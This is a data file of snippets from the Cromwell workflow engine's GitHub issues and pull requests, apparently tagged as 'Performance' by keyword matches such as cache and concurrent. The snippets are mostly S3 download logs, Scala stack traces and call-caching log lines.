Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi; 1608597627949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi; 1608597629983,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:190730,cache,cacheCopy,190730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz.tbi; 1608597279104,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi; 1608597281347,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz; 1608597283995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:93249,cache,cacheCopy,93249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"2 other minor things popped up while call caching the 10K joint genotyping: ; - We spend a fair amount of time creating `GcsPathBuilder`s, which we shouldn't since we only need one per workflow in theory. In practice we need to create a few more because we can't quite propagate the same one around everywhere. But before this PR we would create one per job which seems inefficient. One reason for this is that `JobPaths` extends `WorkflowPaths`, so when we convert the latter to the former we effectively re-instantiate a new `WorkflowPaths` every time. This PR changes that so that `JobPaths` takes a `WorkflowPaths` instead as one of its attribute to avoid unnecessary re-allocations.; - A small optimization to the execution store which allows quicker lookup of ""Done"" jobs which we do a lot in `runnableCalls`. Also added a benchmark test that measures the performance of `runnableCalls`. Below are the results before and after this change. The ""size"" corresponds to how many jobs in ""Done"" and ""NotStarted"" states are inserted in the execution store before calling `runnableCalls`. Results are in ms. Before:; ![screen shot 2017-04-19 at 3 24 15 pm](https://cloud.githubusercontent.com/assets/2978948/25305440/fcca5418-2748-11e7-8d2a-6f2c645f2ef3.png). After:; ![screen shot 2017-04-19 at 3 25 18 pm](https://cloud.githubusercontent.com/assets/2978948/25305444/06de3f00-2749-11e7-860f-a1c077f3243f.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198:699,optimiz,optimization,699,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198,2,"['optimiz', 'perform']","['optimization', 'performance']"
Performance,"2-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.categorical_covariates:0:1-20000000027 [9e4f5894main.categorical_covariates:0:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.categorical_covariates:0:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.pcs:-1:1 cache hit copying success with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.ethnicity_self_report:-1:1-20000000008 [9e4f5894main.ethnicity_self_report:NA:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:56,12] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 cache hit copying success with aggregated hashes: initial = A32F403CF4C1AEE5AC6D327D9290D15E, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:56,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.ethnicity_self_report:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,51] [info] WorkflowExecutionAc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:31112,cache,cache,31112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,200 files scattered 200x fails to call cache due to GCS hash timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873:39,cache,cache,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873,1,['cache'],['cache']
Performance,"20:59,921] [info] WorkflowActor [54108c5b]: starting calls: w.y; [2016-03-22 15:20:59,921] [info] WorkflowActor [54108c5b]: persisting status of y to Starting.; [2016-03-22 15:21:00,344] [info] WorkflowActor [54108c5b]: Call Caching: Cache hit. Using 54108c5b:x as results for 54108c5b:y; [2016-03-22 15:21:00,351] [info] WorkflowActor [54108c5b]: inputs for call 'y':; s -> WdlString(foo); [2016-03-22 15:21:00,352] [info] WorkflowActor [54108c5b]: created call actor for y.; [2016-03-22 15:21:00,352] [info] WorkflowActor [54108c5b]: persisting status of y to Running.; [2016-03-22 15:21:05,567] [error] CallActor [54108c5b:y]: Failing call: Item not found: cromwell-dev/w/54108c5b-29a7-430e-b16b-07bd8dba47e7/call-y/y-stdout.log; cromwell.util.AggregatedException: Item not found: cromwell-dev/w/54108c5b-29a7-430e-b16b-07bd8dba47e7/call-y/y-stdout.log; at cromwell.util.TryUtil$.sequenceIterable(TryUtil.scala:112); at cromwell.util.TryUtil$.sequenceMap(TryUtil.scala:124); at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:640); at cromwell.engine.backend.jes.JesBackend$$anonfun$useCachedCall$1.apply(JesBackend.scala:424); at cromwell.engine.backend.jes.JesBackend$$anonfun$useCachedCall$1.apply(JesBackend.scala:418); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-03-22 15:21:05,568] [info] WorkflowActor [54108c5b]: persisting status of y to Failed.; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/603:1620,concurren,concurrent,1620,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/603,6,['concurren'],['concurrent']
Performance,21.quip_lymphocyte_segmentation:NA:1 failed. The job was stopped before the command finished. PAPI error code 2. Execution failed: generic::unknown: installing drivers: container exited with unexpected exit code 1: + COS_KERNEL_INFO_FILENAME=kernel_info\n+ COS_KERNEL_SRC_ARCHIVE=kernel-src.tar.gz\n+ COS_KERNEL_SRC_HEADER=kernel-headers.tgz\n+ TOOLCHAIN_URL_FILENAME=toolchain_url\n+ TOOLCHAIN_ARCHIVE=toolchain.tar.xz\n+ TOOLCHAIN_ENV_FILENAME=toolchain_env\n+ TOOLCHAIN_PKG_DIR=/build/cos-tools\n+ CHROMIUMOS_SDK_GCS=https://storage.googleapis.com/chromiumos-sdk\n+ ROOT_OS_RELEASE=/root/etc/os-release\n+ KERNEL_SRC_DIR=/build/usr/src/linux\n+ KERNEL_SRC_HEADER=/build/usr/src/linux-headers\n+ NVIDIA_DRIVER_VERSION=450.51.06\n+ NVIDIA_DRIVER_MD5SUM=\n+ NVIDIA_INSTALL_DIR_HOST=/var/lib/nvidia\n+ NVIDIA_INSTALL_DIR_CONTAINER=/usr/local/nvidia\n+ ROOT_MOUNT_DIR=/root\n+ CACHE_FILE=/usr/local/nvidia/.cache\n+ LOCK_FILE=/root/tmp/cos_gpu_installer_lock\n+ LOCK_FILE_FD=20\n+ set +x\n[INFO 2021-02-22 23:09:17 UTC] PRELOAD: false\n[INFO 2021-02-22 23:09:17 UTC] Running on COS build id 13310.1209.10\n[INFO 2021-02-22 23:09:17 UTC] Data dependencies (e.g. kernel source) will be fetched from https://storage.googleapis.com/cos-tools/13310.1209.10\n[INFO 2021-02-22 23:09:17 UTC] Getting the kernel source repository path.\n[INFO 2021-02-22 23:09:17 UTC] Obtaining kernel_info file from https://storage.googleapis.com/cos-tools/13310.1209.10/kernel_info\n[INFO 2021-02-22 23:09:19 UTC] Downloading kernel_info file from https://storage.googleapis.com/cos-tools/13310.1209.10/kernel_info\n\nreal\t0m0.072s\nuser\t0m0.013s\nsys\t0m0.006s\n[INFO 2021-02-22 23:09:19 UTC] Checking if this is the only cos-gpu-installer that is running.\n[INFO 2021-02-22 23:09:19 UTC] Checking if third party kernel modules can be installed\n[INFO 2021-02-22 23:09:19 UTC] Checking cached version\n[INFO 2021-02-22 23:09:19 UTC] Cache file /usr/local/nvidia/.cache not found.\n[INFO 2021-02-22 23:09:19 UTC] Did not fin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6195:2789,cache,cache,2789,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195,1,['cache'],['cache']
Performance,"224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2017-02-02 11:55:36,711 cromwell-system-akka.dispatchers.engine-dispatcher-19 ERROR - WorkflowManagerActor Workflow 5fdb357a-3f1d-45b7-a85b-c22caa755c36 failed (during ExecutingWorkflowState): java.lang.IllegalArgumentException; cromwell.core.CromwellFatalException: java.lang.IllegalArgumentException; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:13",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:6863,concurren,concurrent,6863,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['concurren'],['concurrent']
Performance,"235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.pollAndExecAll(ForkJoinPool.java:1253) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1346) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(88b21d2d)]: Call failed to initialize: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log: None.get; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 INFO - WorkflowActor [UUID(88b21d2d)]: persisting status of PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log to Failed.; 2016-06-01 16:10:15,230 cromwell-system-akka.actor.default-dispatcher-20 INFO - WorkflowActor [UUID(88b21d2d)]: Beginning transition from Running to Failed.; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:3980,concurren,concurrent,3980,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,3,['concurren'],['concurrent']
Performance,257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	... 5 more; Caused by: java.util.NoSuchElementException: key not found: ps-stdOut; 	at scala.collection.immutable.Map$Map1.apply(Map.scala:108); 	at cromwell.core.simpleton.WomValueBuilder$.$anonfun$toWdlValues$5(WomValueBuilder.scala:147); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.Map$Map1.foreach(Map.scala:120); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.core.simpleton.WomValueBuilder$.toWdlValues(WomValueBuilder.scala:147); 	at cromwell.core.simpleton.WomValueBuilder$.toJobOutputs(WomValueBuilder.scala:133); 	at cromwell.jobstore.SqlJobStore.$anonfun$readJobResult$2(SqlJobStore.scala:74); 	at scala.Option.map(Option.scala:146); 	at cromwell.jobstore.SqlJobStore.$anonfun$readJobResult$1(SqlJobStore.scala:70); 	at scala.util.Success.$anonfun$map$1(Try.scala:251); 	at scala.util.Success.map(Try.scala:209); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:289); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	... 4 more; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012:9815,concurren,concurrent,9815,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012,5,['concurren'],['concurrent']
Performance,2667. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 210 times over 3.3447279390999998 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:249,concurren,concurrent,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,3,['concurren'],['concurrent']
Performance,"27] [info] JesAsyncBackendJobExecutionActor [fd2fcb78case_gatk_acnv_workflow.HetPulldown:15:1]: JesAsyncBackendJobExecutionActor [fd2fcb78:case_gatk_acnv_workflow.HetPulldown:15:1] Status change from - to Initializing; [2016-10-27 13:47:24,90] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647:2081,concurren,concurrent,2081,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647,5,['concurren'],['concurrent']
Performance,"2:41,842 cromwell-system-akka.actor.default-dispatcher-33 ERROR - guardian failed, shutting down system; wdl4s.exception.ValidationException: Failed to import workflow foo.wdl.:; File not found /tmp/640585481854205084.zip4511378926145376874/bar/foo.wdl; 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$tryResolve$1(WdlNamespace.scala:198); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:208); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:207); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDesc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:1738,load,loadUsingSource,1738,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['load'],['loadUsingSource']
Performance,"2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.white_brits' (scatter index: None, attempt 1); [2022-12-15 21:23:03,67] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 3; [2022-12-15 21:23:03,69] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:23:03,70] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:23:03,70] [info] BT-322 9e4f5894:main.pcs:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:27:50,35] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.assessment_ages:-1:1-20000000002 [9e4f5894main.assessment_ages:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,35] [info] BT-322 9e4f5894:main.assessment_ages:-1:1 cache hit copying success with aggregated hashes: initial = EEC3507DAE39FE605FDE6F9F6FC0A5A8, file = 